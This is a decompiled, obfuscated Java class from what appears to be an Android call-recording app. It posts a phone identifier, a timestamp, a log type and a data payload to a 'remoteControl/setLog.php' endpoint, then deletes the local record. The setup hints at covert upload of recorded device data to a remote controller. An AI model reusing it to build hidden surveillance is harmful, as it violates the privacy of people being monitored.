package com.yasoka.spcallrecord.recorder.call.a.c.a;

import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import com.app.action.a;
import com.app.activity.MyApp;
import java.util.HashMap;
import java.util.Map;

/* compiled from: GetListMessage */
public class f {

    /* renamed from: a reason: collision with root package name */
    private int f16a;

    /* renamed from: b reason: collision with root package name */
    private int f17b;

    /* renamed from: c reason: collision with root package name */
    private String f18c;

    /* renamed from: d reason: collision with root package name */
    private String f19d;

    public f(int i, int i2, String str, String str2) {
        this.f16a = i;
        this.f17b = i2;
        this.f18c = str;
        this.f19d = str2;
        String str3 = "";
        try {
            Context applicationContext = MyApp.b().getApplicationContext();
            String b2 = a.b(applicationContext, this.f16a, this.f18c);
            String b3 = c.b();
            HashMap hashMap = new HashMap();
            StringBuilder sb = new StringBuilder();
            sb.append(str3);
            sb.append(e.e(applicationContext));
            hashMap.put("idPhone", sb.toString());
            hashMap.put("dateConnexion", b3);
            hashMap.put("type", this.f19d);
            StringBuilder sb2 = new StringBuilder();
            sb2.append(str3);
            sb2.append(this.f17b);
            hashMap.put("idLog", sb2.toString());
            hashMap.put("data", b2);
            long a2 = a.a.a(e.e(applicationContext), b3, this.f19d, this.f17b, b2, applicationContext);
            if (a.c.e.a.b("remoteControl/setLog.php", (Map<String, String>) hashMap)) {
                a.a.d((int) a2, applicationContext);
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }
}
